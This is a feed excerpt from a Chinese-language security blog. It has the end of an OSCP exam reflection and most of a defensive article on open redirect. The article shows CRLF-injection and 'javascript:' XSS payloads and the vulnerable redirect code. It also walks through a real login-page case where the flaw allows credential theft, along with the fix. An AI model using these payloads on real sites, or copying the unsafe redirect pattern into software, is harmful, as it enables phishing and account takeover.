&lt;p&gt;You&#39;ll run out of ideas before you run out of time&lt;/p&gt;
&lt;/blockquote&gt;
&lt;ul&gt;
&lt;li&gt;考試只能用到一次 Metasploit，所以請留到非不得已，你能在 Metasploit 找到的 exploit 也一定可以在其他地方找到公開 exploit。平常練習 lab 也請不要依賴 Metasploit。&lt;/li&gt;
&lt;li&gt;OffSec 標榜 Try Harder，我個人的詮釋是再多研究多嘗試一些，想想還有什麼事能做但還沒做，或是有什麼遺漏的地方，把你會的都發揮出來。但當你撞到一面牆，重複 google 同一個關鍵字、跑同一個 exploit 20 次是沒用的，適時的求救能幫你用更短的時間學到一樣的東西。&lt;/li&gt;
&lt;li&gt;OffSec 有下面這張 Pass rate vs machines compromised 的統計圖，不過除了很直觀的『打越多越安心』之外根本沒什麼資訊。我想說的是，打機器只是訓練你的熟練度跟方法論的完善程度，如果你完全不用依靠論壇就可以順順一天打好幾台，就算你最後只完成了 20 台也一樣可以考過。不用太拘泥這個數字。&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;figure&gt;&lt;img src=&quot;https://tech-blog.cymetrics.io/img/posts/crystal/oscp/pass-rate.png&quot;&gt;&lt;figcaption&gt;&lt;p&gt;Pass rate vs machines compromised&lt;/p&gt;
&lt;/figcaption&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;h3 id=&quot;%E5%BF%83%E5%BE%97&quot;&gt;&lt;a class=&quot;direct-link&quot; href=&quot;#%E5%BF%83%E5%BE%97&quot;&gt;#&lt;/a&gt; 心得&lt;/h3&gt;
&lt;p&gt;剛決定考 OSCP 時其實覺得有些慌張，畢竟什麼都不會要怎麼考？但隨著解開的 box 越來越多，累積的筆記跟技巧越來越豐富，心裡的踏實感也會逐漸累積，大概就是學習曲線上從『我知道我不知道』走向『我知道我知道』的成就感。&lt;/p&gt;
&lt;p&gt;技術上，OSCP 難度的確不高，考驗的是觀察力跟串連資訊找到漏洞的能力，只要發現對的破口幾乎就一擊斃命。考試剛開始時緊張到手抖，根本不能好好思考，後面出去散個步回來放鬆一點後雜亂的資訊就都自己連線歸位了。快要考試的人們，你們是一定可以做到的，要相信自己累積的實力早就超過考試所需了，只是壓力讓你眼睛業障重，過了 15 個小時只有 25 分也無所謂，剩下的時間絕對夠你把其他機器都打完，別慌。&lt;/p&gt;
&lt;p&gt;給想要嘗試 OSCP 的人們，不論你是什麼背景與經驗，都可以去玩玩看 HTB 之類的平台來感受一下。一開始會卡住或是茫然是完全正常的，我的前幾個 box 也是在『我該幹嘛？』『然後呢？？』中度過的。這是你學習的第一步，多堅持一下你會比想像中進步更快！&lt;/p&gt;
&lt;p&gt;這半年內，我在 HTB 訓練的各種技巧跟 OSCP 的滲透思維都給了我很多成長跟養分，推薦給想學習更多的 hacker wannabes！我也要繼續朝下一張前進了！&lt;/p&gt;
&lt;p&gt;有問題可以在下面留言，我會在不違規的情況下盡量回答 XDDD&lt;/p&gt;

		</content>
	</entry>
	
	<entry>
		<title>在做跳轉功能時應該注意的問題：Open Redirect</title>
		<link href="https://tech-blog.cymetrics.io/posts/huli/open-redirect/"/>
		<updated>2021-09-07T00:00:00-00:00</updated>
		<id>https://tech-blog.cymetrics.io/posts/huli/open-redirect/</id>
		<content type="html">
		  &lt;h2 id=&quot;%E5%89%8D%E8%A8%80&quot;&gt;&lt;a class=&quot;direct-link&quot; href=&quot;#%E5%89%8D%E8%A8%80&quot;&gt;#&lt;/a&gt; 前言&lt;/h2&gt;
&lt;!-- summary --&gt;
&lt;p&gt;在許多網站中都有個很常見的功能，就是重新導向。&lt;/p&gt;
&lt;p&gt;舉例來說，如果要觀看的頁面需要權限但是使用者還沒登入，就會先把使用者導去登入頁面，登入完之後再導回原本要去的頁面。&lt;/p&gt;
&lt;!-- summary --&gt;
&lt;p&gt;例如說今天有個社群網站，想要看個人檔案的話需要登入，而小明的個人檔案網址是：&lt;code&gt;https://example.com/profile/ming&lt;/code&gt;，那我身為一個訪客，點進去之後就會跳轉到登入頁面，並且帶上我原本要去的網址當作參數：&lt;br&gt;
&lt;code&gt;https://example.com/login?redirect=https://example.com/profile/ming&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;登入成功之後，網站就會根據 &lt;code&gt;redirect&lt;/code&gt; 的值，把我導去原本要前往的頁面。&lt;/p&gt;
&lt;p&gt;雖然看起來是個小功能，但其實背後有不少安全性的問題要考慮。&lt;/p&gt;
&lt;h2 id=&quot;%E4%BB%80%E9%BA%BC%E6%98%AF-open-redirect%EF%BC%9F&quot;&gt;&lt;a class=&quot;direct-link&quot; href=&quot;#%E4%BB%80%E9%BA%BC%E6%98%AF-open-redirect%EF%BC%9F&quot;&gt;#&lt;/a&gt; 什麼是 open redirect？&lt;/h2&gt;
&lt;p&gt;Open redirect，中文通常翻作開放式重定向或是公開重定向之類的，但我自己喜歡翻成：「任意重新導向」，覺得比較貼近原意，就是可以重新導向到任意目的地。&lt;/p&gt;
&lt;p&gt;以文章開頭的例子來說，攻擊者其實可以在 URL 上面帶任何值，例如說：&lt;code&gt;https://attacker.com&lt;/code&gt;，這樣使用者在登入之後，就會跳轉到這個頁面。&lt;/p&gt;
&lt;p&gt;像這個就是需要使用者操作（登入）才能觸發重新導向，但有些功能無需使用者操作，可能就有著重新導向的功能。以登入的這個例子來說，假設使用者已經登入了，那 &lt;code&gt;https://example.com/login?redirect=https://attacker.com&lt;/code&gt; 這個連結點下去之後，系統偵測到已經登入，就會直接把使用者轉到 &lt;code&gt;https://attacker.com&lt;/code&gt;。&lt;/p&gt;
&lt;p&gt;這造成的結果是什麼呢？&lt;/p&gt;
&lt;p&gt;使用者點了一個 &lt;a href=&quot;http://example.com/&quot;&gt;example.com&lt;/a&gt; 的連結，卻在無意間被轉到 &lt;a href=&quot;http://attacker.com/&quot;&gt;attacker.com&lt;/a&gt; 去。這種可以直接把使用者導到任意地方去的漏洞，就叫做 open redirect。&lt;/p&gt;
&lt;h2 id=&quot;open-redirect-%E8%83%BD%E9%80%A0%E6%88%90%E4%BB%80%E9%BA%BC%E5%95%8F%E9%A1%8C%EF%BC%9F&quot;&gt;&lt;a class=&quot;direct-link&quot; href=&quot;#open-redirect-%E8%83%BD%E9%80%A0%E6%88%90%E4%BB%80%E9%BA%BC%E5%95%8F%E9%A1%8C%EF%BC%9F&quot;&gt;#&lt;/a&gt; Open redirect 能造成什麼問題？&lt;/h2&gt;
&lt;p&gt;一個最直覺能想到的攻擊方式，大概就是釣魚網站了。在講攻擊手法的時候，我覺得「情境」是一個滿重要的因素，有些看似沒什麼的攻擊，在搭配適當的情境之後，你會覺得「哇，好像滿容易成功的」。&lt;/p&gt;
&lt;p&gt;在看得到網址的狀況下，你看到陌生的網址就會比較小心翼翼，因為你知道可能會是詐騙或是釣魚網站；但若是看到熟悉的網址，會放鬆一些戒心：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://tech-blog.cymetrics.io/img/posts/huli/open-redirect/chat.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;圖上的網址最後那段其實是 &lt;a href=&quot;https://attacker.com/&quot;&gt;https://attacker.com&lt;/a&gt; url encode 過的結果，所以使用者根本不會注意到後面那串，只會看到前面是由 &lt;a href=&quot;http://facebookb.com/&quot;&gt;facebookb.com&lt;/a&gt; 開頭，這邊我想強調的事情是「看到熟悉的網址，使用者會比較沒有戒心」。&lt;/p&gt;
&lt;p&gt;但這樣子的情境，其實很類似的網址也可以達成差不多的事情（只是效力比較低），例如說 &lt;a href=&quot;http://facebo0k.com/&quot;&gt;facebo0k.com&lt;/a&gt; 或是 &lt;a href=&quot;http://myfacebook.com/&quot;&gt;myfacebook.com&lt;/a&gt; 之類的。&lt;/p&gt;
&lt;p&gt;這時候可以再設想另外一個情境，就是有些網站當你點擊外部連結的時候，會提醒你說：「你要連到外部網站了喔，要小心喔」，這時候如果利用 open redirect 的話，網站可能就不會跳出提示（因為是同一個網域），使用者或許就在無意之間跳到了別的網站而不自知。&lt;/p&gt;
&lt;p&gt;例如說今天有個論壇好了，有個地方有 open redirect 的漏洞，然後我在文章裡面放了一個連結，利用 open redirect 讓跳去外部網站的提示失效，而使用者點了連結之後會到「精心設計的釣魚網站」，介面長得一模一樣，但是跳出個要輸入帳號密碼的 popup 跟你說你的連線階段已過期，請重新登入。這時使用者就有比較高的機率會去輸入帳號密碼，因為沒有想到自己被跳轉到釣魚網站。&lt;/p&gt;
&lt;p&gt;以上這些問題，都只是在討論 open redirect 「不跟其他漏洞結合」的狀況下，可以造成哪些危害，聽起來好像還好對吧？跟其他攻擊比起來似乎沒什麼，但是 open redirect 被低估的地方，其實是在它與其他漏洞的結合之後，可以發揮出的威力。&lt;/p&gt;
&lt;p&gt;在繼續往下之前，我們必須先了解一下重新導向的實作，主要分為兩種：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;後端重新導向，透過 response header &lt;code&gt;Location&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;前端重新導向，可能透過 history.push 或是 window.open 以及 location 等等&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;第一種透過後端來做 redirect，是靠 server 回傳 &lt;code&gt;Location&lt;/code&gt; 這個 header，瀏覽器就會把使用者導到相對應的地方去。實作上可能會像是這樣：&lt;/p&gt;
&lt;pre class=&quot;language-js&quot;&gt;&lt;code class=&quot;language-js&quot;&gt;&lt;span class=&quot;token keyword&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;handler&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token parameter&quot;&gt;req&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; res&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;&lt;br&gt;  res&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;setStatus&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;302&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;br&gt;  res&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;setHeader&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&#39;Location: &#39;&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;+&lt;/span&gt; req&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;query&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;redirect&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;br&gt;  &lt;span class=&quot;token keyword&quot;&gt;return&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;而第二種由前端實作的就不太一樣了，一個常見的範例是直接把要去的地方 assign 給 &lt;code&gt;window.location&lt;/code&gt; 做頁面跳轉：&lt;/p&gt;
&lt;pre class=&quot;language-js&quot;&gt;&lt;code class=&quot;language-js&quot;&gt;&lt;span class=&quot;token keyword&quot;&gt;const&lt;/span&gt; searchParams &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;token class-name&quot;&gt;URLSearchParams&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;location&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;search&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;br&gt;window&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;location &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; searchParams&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;get&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&#39;redirect&#39;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;或如果是 SPA 不想換頁的話，可能會直接用 &lt;code&gt;history.push&lt;/code&gt; 或是框架內建的 router.push。&lt;/p&gt;
&lt;p&gt;而無論是前端還是後端來做重新導向，光是實作方式都有各自的問題需要處理。&lt;/p&gt;
&lt;h2 id=&quot;%E5%BE%8C%E7%AB%AF%EF%BC%9Acrlf-injection&quot;&gt;&lt;a class=&quot;direct-link&quot; href=&quot;#%E5%BE%8C%E7%AB%AF%EF%BC%9Acrlf-injection&quot;&gt;#&lt;/a&gt; 後端：CRLF injection&lt;/h2&gt;
&lt;p&gt;後端的重新導向中，會把傳過來的值塞到 &lt;code&gt;Location&lt;/code&gt; 這個 response header 裡面。有些 server 或是 framework 如果沒有處理好的話，可以塞入換行字元，例如說把重新導向的網址設定為 &lt;code&gt;abc\ntest:123&lt;/code&gt;，有可能 response 就變成：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;HTTP/2 302 Found
Location: abc
test:123
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;那若是改成：&lt;code&gt;abc\n\n&amp;lt;script&amp;gt;alert(1)&amp;lt;/script&amp;gt;&lt;/code&gt;，response 就會變成：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;HTTP/2 302 Found
Location: abc

&amp;lt;script&amp;gt;alert(1)&amp;lt;/script&amp;gt;
....
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;藉由 CRLF injection 去改變 response body 的內容，但很遺憾似乎無法直接達成 XSS，因為瀏覽器看到 status code 是 301/302 時會忽略 response body，直接把使用者導去目標頁面。&lt;/p&gt;
&lt;p&gt;我找到可以運作的資料都已經是四五年前的了：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;&lt;a href=&quot;https://hackerone.com/reports/192667&quot;&gt;[stagecafrstore.starbucks.com] CRLF Injection, XSS&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://hackerone.com/reports/260744&quot;&gt;[dev.twitter.com] XSS and Open Redirect&lt;/a&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;我記得我好像看過有篇文章在講這種情況應該怎麼辦，但我找很久都找不到，如果知道該怎麼繞過的請告訴我。&lt;/p&gt;
&lt;p&gt;不過就算改變 response body 沒什麼用，改變其他的 header 也可能串聯其他攻擊，例如說 Set-Cookie，可以幫使用者設置任意 cookie，就有機會再串接 session fixation 或是 CSRF 之類的攻擊。&lt;/p&gt;
&lt;h2 id=&quot;%E5%89%8D%E7%AB%AF%EF%BC%9Axss&quot;&gt;&lt;a class=&quot;direct-link&quot; href=&quot;#%E5%89%8D%E7%AB%AF%EF%BC%9Axss&quot;&gt;#&lt;/a&gt; 前端：XSS&lt;/h2&gt;
&lt;p&gt;如果是前端實作的重新導向，要特別注意的一個問題就是 XSS。&lt;/p&gt;
&lt;p&gt;你可能會疑惑重新導向跟 XSS 有什麼關係，我們先來回顧一下前端重新導向的程式碼：&lt;/p&gt;
&lt;pre class=&quot;language-js&quot;&gt;&lt;code class=&quot;language-js&quot;&gt;&lt;span class=&quot;token keyword&quot;&gt;const&lt;/span&gt; searchParams &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;token class-name&quot;&gt;URLSearchParams&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;location&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;search&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;br&gt;window&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;location &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; searchParams&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;get&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&#39;redirect&#39;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;這樣會有什麼問題呢？&lt;/p&gt;
&lt;p&gt;在 JS 裡面有個應該不少人看過，但可能比較少用的東西，叫做 JavaScript pseudo protocol，像是這樣：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;&amp;lt;a href=&amp;quot;javascript:alert(1)&amp;quot;&amp;gt;click me&amp;lt;/a&amp;gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;點了那個 a 之後，會執行 JS 跳出一個 alert。而這招除了可以用在 href 以外，其實也可以用在 location 上面：&lt;/p&gt;
&lt;pre class=&quot;language-js&quot;&gt;&lt;code class=&quot;language-js&quot;&gt;window&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;location &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&#39;javascript:alert(1)&#39;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;打開你的瀏覽器開新分頁，然後在 devtool console 直接執行上面那一段，會發現 alert 真的跳出來了，而且以下幾種方式都會觸發：&lt;/p&gt;
&lt;pre class=&quot;language-js&quot;&gt;&lt;code class=&quot;language-js&quot;&gt;window&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;location&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;href &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&#39;javascript:alert(1)&#39;&lt;/span&gt;&lt;br&gt;window&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;location&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;assign&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&#39;javascript:alert(1)&#39;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;br&gt;window&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;location&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;replace&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&#39;javascript:alert(1)&#39;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;因此攻擊者只要把 redirect 的位置設置成 &lt;code&gt;javascript:xxx&lt;/code&gt;，就可以執行任意程式碼，觸發 XSS。這個案例前端的朋友們一定要特別注意，因為直接把值 assign 給 location 是個很常見的實作方式。&lt;/p&gt;
&lt;p&gt;底下直接帶大家看一個真實世界的案例，對象是之前在另一篇文章：&lt;a href=&quot;https://tech-blog.cymetrics.io/posts/huli/prevent-xss-might-be-harder-than-you-thought/&quot;&gt;防止 XSS 可能比想像中困難&lt;/a&gt;出現過的網站：&lt;a href=&quot;https://matters.news/&quot;&gt;Matters News&lt;/a&gt;。&lt;/p&gt;
&lt;p&gt;這是他們的登入頁面：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://tech-blog.cymetrics.io/img/posts/huli/open-redirect/matters.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;在點下登入之後，會呼叫一個叫做 &lt;code&gt;redirectToTarget&lt;/code&gt; 的 function，而這個函式的程式碼是這樣：&lt;/p&gt;
&lt;pre class=&quot;language-js&quot;&gt;&lt;code class=&quot;language-js&quot;&gt;&lt;span class=&quot;token comment&quot;&gt;/**&lt;br&gt; * Redirect to &quot;?target=&quot; or fallback URL with page reload.&lt;br&gt; *&lt;br&gt; * (works on CSR)&lt;br&gt; */&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;token keyword&quot;&gt;export&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;const&lt;/span&gt; redirectToTarget &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;&lt;br&gt;  fallback &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&#39;current&#39;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;&lt;br&gt;  fallback&lt;span class=&quot;token operator&quot;&gt;?&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&#39;homepage&#39;&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&#39;current&#39;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;=&gt;&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;&lt;br&gt;  &lt;span class=&quot;token keyword&quot;&gt;const&lt;/span&gt; fallbackTarget &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt;&lt;br&gt;    fallback &lt;span class=&quot;token operator&quot;&gt;===&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&#39;homepage&#39;&lt;/span&gt;&lt;br&gt;      &lt;span class=&quot;token operator&quot;&gt;?&lt;/span&gt; &lt;span class=&quot;token template-string&quot;&gt;&lt;span class=&quot;token template-punctuation string&quot;&gt;`&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;token template-punctuation string&quot;&gt;`&lt;/span&gt;&lt;/span&gt; &lt;span class=&quot;token comment&quot;&gt;// FIXME: to purge cache&lt;/span&gt;&lt;br&gt;      &lt;span class=&quot;token operator&quot;&gt;:&lt;/span&gt; window&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;location&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;href&lt;br&gt;  &lt;span class=&quot;token keyword&quot;&gt;const&lt;/span&gt; target &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;getTarget&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;||&lt;/span&gt; fallbackTarget&lt;br&gt;&lt;br&gt;  window&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;location&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;href &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;decodeURIComponent&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;target&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;在拿到 target 之後直接使用了：&lt;code&gt;window.location.href = decodeURIComponent(target)&lt;/code&gt; 來做重新導向。而 &lt;code&gt;getTarget&lt;/code&gt; 其實就是去 url query string 把 target 的值拿出來。所以如果登入的網址是：&lt;code&gt;https://matters.news/login?target=javascript:alert(1)&lt;/code&gt;，在使用者按下登入並且成功之後，就會跳出一個 alert，觸發 XSS！&lt;/p&gt;
&lt;p&gt;不僅如此，這個 XSS 一旦被觸發了，影響力非同小可，因為這是登入頁面，所以在這個頁面上執行的 XSS，可以直接抓取 input 的值，也就是偷到使用者的帳號密碼。如果要執行實際的攻擊，可以針對網站的使用者寄發釣魚信，在信中放入這個惡意連結讓使用者點擊，由於網址是正常的網址，點擊之後到的頁面也是真的網站的頁面，因此可信程度應該滿高的。&lt;/p&gt;
&lt;p&gt;在使用者輸入帳號密碼並且登入之後，用 XSS 把帳號密碼偷走並把使用者導回首頁，就可以不留痕跡地偷走使用者帳號，達成帳號奪取。&lt;/p&gt;
&lt;p&gt;修復方式是只允許 http/https 開頭的網址：&lt;/p&gt;
&lt;pre class=&quot;language-js&quot;&gt;&lt;code class=&quot;language-js&quot;&gt;&lt;span class=&quot;token keyword&quot;&gt;const&lt;/span&gt; fallbackTarget &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt;&lt;br&gt;  fallback &lt;span class=&quot;token operator&quot;&gt;===&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&#39;homepage&#39;&lt;/span&gt;&lt;br&gt;    &lt;span class=&quot;token operator&quot;&gt;?&lt;/span&gt; &lt;span class=&quot;token template-string&quot;&gt;&lt;span class=&quot;token template-punctuation string&quot;&gt;`&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;token template-punctuation string&quot;&gt;`&lt;/span&gt;&lt;/span&gt; &lt;span class=&quot;token comment&quot;&gt;// FIXME: to purge cache&lt;/span&gt;&lt;br&gt;    &lt;span class=&quot;token operator&quot;&gt;:&lt;/span&gt; window&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;location&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;href&lt;br&gt;&lt;span class=&quot;token keyword&quot;&gt;let&lt;/span&gt; target &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;decodeURIComponent&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;getTarget&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;br&gt;&lt;br&gt;&lt;span class=&quot;token keyword&quot;&gt;const&lt;/span&gt; isValidTarget &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token regex&quot;&gt;&lt;span class=&quot;token regex-delimiter&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;token regex-source language-regex&quot;&gt;^((http|https):\/\/)&lt;/span&gt;&lt;span class=&quot;token regex-delimiter&quot;&gt;/&lt;/span&gt;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;test&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;target&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;token keyword&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;!&lt;/span&gt;isValidTarget&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;&lt;br&gt;  target &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; fallbackTarget&lt;br&gt;&lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;br&gt;&lt;br&gt;window&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;location&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;href &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; target &lt;span class=&quot;token operator&quot;&gt;||&lt;/span&gt; fallbackTarget&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;不過這樣其實是先把重新導向功能的 XSS 修掉而已，open redirect 的部分依舊存在，需要進一步對 domain 做檢查才能排除 open redirect。&lt;/p&gt;
&lt;p&gt;再次提醒，這個漏洞滿多工程師都不會發現，因為不知道 &lt;code&gt;window.location.href&lt;/code&gt; 可以放 &lt;code&gt;javascript:alert(1)&lt;/code&gt; 這樣的網址來執行程式碼，如果大家有實作到重新導向的功能，記得注意一下這個問題。&lt;/p&gt;
&lt;h2 id=&quot;open-redirect-%E8%88%87%E5%85%B6%E4%BB%96%E6%BC%8F%E6%B4%9E%E7%9A%84%E6%90%AD%E9%85%8D&quot;&gt;&lt;a class=&quot;direct-link&quot; href=&quot;#open-redirect-%E8%88%87%E5%85%B6%E4%BB%96%E6%BC%8F%E6%B4%9E%E7%9A%84%E6%90%AD%E9%85%8D&quot;&gt;#&lt;/a&gt; Open redirect 與其他漏洞的搭配&lt;/h2&gt;
&lt;p&gt;從上面兩個問題可以看出光是「實作重新導向」就可能會寫出有漏洞的程式碼，而接下來要談的是「重新導向」這個功能與其他漏洞的結合。有至少兩個類型的漏洞都有機會與 open redirect 結合，一個是 SSRF，另一個是 OAuth 的漏洞。&lt;/p&gt;
